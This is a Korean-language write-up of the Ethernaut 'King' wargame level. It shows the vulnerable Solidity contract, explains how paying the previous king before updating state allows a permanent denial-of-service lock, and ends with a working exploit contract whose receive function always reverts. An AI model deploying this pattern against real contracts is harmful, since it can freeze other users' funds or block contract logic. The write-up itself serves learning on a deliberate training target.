---
title: "Ethernaut 09 King"
published: 2026-05-07
description: "Ethernaut 09 King 문제 풀이."
category: "CTF/Wargame"
tags: ["Web3", "Ethernaut", "Writeup"]
listed: false
---

## 문제
### 지문
King 컨트랙트는 더 많은 ETH를 보내면 현재 `king`을 밀어내고 새로운 `king`이 되는 구조다.
목표는 내가 `king`이 된 뒤, Ethernaut 레벨 컨트랙트가 다시 왕좌를 가져가지 못하게 만드는 것이다.
즉 단순히 더 많은 ETH를 보내서 `king`이 되는 것만으로는 부족하다. 이후 누군가가 `receive()`를 실행했을 때 이전 `king`에게 ETH를 돌려주는 과정이 실패하도록 만들어야 한다.
### 코드
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
## 배경지식
---
컨트랙트에 calldata 없이 ETH를 보내면 `receive()`가 실행된다. `King`도 별도 함수 호출이 아니라 ETH를 보내는 것만으로 왕 교체 로직이 실행된다.
```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```
공격자는 `King`의 특정 함수를 호출할 필요가 없다. `King` 주소로 현재 `prize` 이상을 보내면 왕 교체 로직이 돈다.
---
`transfer`는 수신자에게 ETH를 보내고, 수신이 실패하면 전체 트랜잭션을 revert한다.
여기서는 상태 업데이트 순서를 봐야 한다. `King`은 새 `king`을 기록하기 전에 먼저 기존 `king`에게 ETH를 돌려준다.
```solidity
payable(king).transfer(msg.value);
king = msg.sender;
prize = msg.value;
```
이전 `king`이 ETH 수신을 거부하면 `transfer`가 실패하고, 그 아래의 `king = msg.sender`까지 도달하지 못한다.
---
공격 컨트랙트가 `king`이 된 뒤 `receive()`에서 항상 revert하도록 만들면, 이후 다른 주소가 왕을 뺏으려고 할 때 `King`이 공격 컨트랙트로 ETH를 돌려주다가 실패한다.
```solidity
receive() external payable {
    revert("nope");
}
```
이렇게 되면 공격 컨트랙트는 한 번 왕이 된 뒤 계속 `king`으로 남는다.
## 문제 코드 분석
---
먼저 왕 교체 조건을 보자.
```solidity
require(msg.value >= prize || msg.sender == owner);
```
일반 사용자는 현재 `prize` 이상을 보내야 `receive()`를 통과할 수 있다. 반면 `owner`는 금액 조건 없이 통과할 수 있다.
초기 `owner`와 `king`은 생성자인 Ethernaut Factory 쪽 주소다. 플레이어는 `prize` 이상을 보내서 먼저 `king`이 되어야 한다.
---
외부 호출은 여기서 일어난다.
```solidity
payable(king).transfer(msg.value);
```
새 왕을 기록하기 전에 기존 왕에게 ETH를 보내는 구조다.
기존 왕이 EOA라면 보통 문제없이 ETH를 받는다. 하지만 기존 왕이 컨트랙트이고, 그 컨트랙트가 ETH 수신을 거부하면 `transfer`가 revert된다.
그래서 공격 경로는 `King`을 직접 소유하는 쪽이 아니다. ETH를 받을 수 없는 공격 컨트랙트를 `king`으로 등록하는 쪽이다.
---
상태 업데이트 순서도 이어서 보자.
```solidity
payable(king).transfer(msg.value);
king = msg.sender;
prize = msg.value;
```
`king`과 `prize`는 `transfer`가 성공한 뒤에만 바뀐다.
즉 현재 `king`이 ETH 수신을 거부하면, 이후 도전자가 아무리 ETH를 보내도 `king = msg.sender`까지 실행되지 않는다. 이 순서 때문에 공격 컨트랙트가 왕좌를 잠글 수 있다.
---
King 레벨의 검증은 Factory가 다시 `King` 컨트랙트에 ETH를 보내보는 방식으로 진행된다.
```solidity
(bool result,) = address(instance).call{value: 0}("");
!result;
return instance._king() != address(this);
```
Factory는 `owner`이기 때문에 `msg.value`가 0이어도 `require(msg.value >= prize || msg.sender == owner)`를 통과한다.
하지만 현재 `king`이 공격 컨트랙트라면, `payable(king).transfer(0)`도 공격 컨트랙트의 `receive()`를 실행한다. 공격 컨트랙트가 여기서 revert하므로 Factory의 호출은 실패하고, `king`은 여전히 Factory가 아닌 공격 컨트랙트로 남는다.
## 풀이
공격 컨트랙트를 만들고, 생성자에서 `King` 인스턴스에 현재 `prize` 이상을 보낸다. 이때 `msg.sender`는 EOA가 아니라 공격 컨트랙트가 되므로 `king`에는 공격 컨트랙트 주소가 저장된다.
그 다음 공격 컨트랙트의 `receive()`를 항상 revert하게 둔다. 이후 Ethernaut Factory나 다른 사용자가 왕을 가져가려고 해도, `King`이 기존 왕인 공격 컨트랙트에게 ETH를 돌려주는 순간 호출이 실패한다.
### 익스플로잇
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable target) payable {
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "failed to become king");
    }

    receive() external payable {
        revert("refuse ether");
    }
}
```
